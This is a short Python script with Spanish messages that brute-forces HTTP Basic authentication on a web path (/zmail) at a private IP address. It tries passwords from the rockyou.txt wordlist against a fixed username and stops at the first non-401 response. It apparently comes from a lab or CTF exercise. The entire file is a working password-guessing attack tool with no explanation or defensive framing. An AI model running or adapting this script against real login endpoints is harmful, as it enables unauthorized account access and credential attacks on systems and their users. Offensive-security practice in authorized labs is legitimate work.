#!/usr/bin/python3
import requests
import sys
import signal
import time
from base64 import b64encode
from base64 import b64decode
from pwn import *
import pdb
def def_handler(signal, frame):
	print("\n\n[!]Saliendo...")
	sys.exit(1)
#Ctrl+C
signal.signal(signal.SIGINT, def_handler)

main_url = "http://192.168.1.139/zmail"
def makeRequest(combinacion, p1):

	variable = b64encode(combinacion.encode())
	variabledeco= variable.decode()
	headers={
	'Authorization': 'Basic %s' % variabledeco
	}
	try:
		r = requests.get(main_url, headers=headers, verify=False)
		if r.status_code!= 401:
	                print (r.status_code)
        	        print (variabledeco)
               		p1.success()
                	sys.exit(0)

	except:
		time.sleep(5)
		print("fallo conexion")

def makeAuth():
	users = ["deez1", "p48", "all2"]
	f= open("/usr/share/wordlists/rockyou.txt","rb")
	p1 = log.progress("Fuerza bruta")
	p1.status ("Iniciando proceso de fuerza bruta")
	counter = 1
	for password in f.readlines():
		password= (password.strip()).decode()
		combinacion = (users[1] + ':' + password)
#		pdb.set_trace()
		p1.status("PRobando con la contrase√±a [ %d / 14244292 ]: %s " % (counter, combinacion.split(":")[1]))
		makeRequest(combinacion, p1)
		counter += 1
#		break;
if __name__ == '__main__':
	makeAuth()
